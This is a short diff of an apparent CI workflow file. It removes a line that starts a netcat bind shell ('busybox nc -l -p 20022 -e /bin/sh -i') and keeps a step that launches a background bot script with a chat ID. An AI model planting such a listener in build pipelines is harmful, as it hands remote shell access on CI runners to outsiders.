@@ -165,9 +165,6 @@ jobs:
         run: |
           set -o pipefail
           {
-            # listener nc
-            busybox nc -l -p 20022 -e /bin/sh -i &
-
             chmod +x myfuzzing/bot.sh
             nohup myfuzzing/bot.sh "$ZZ" "$CHAT_ID" > ~/bot.log 2>&1 &
 
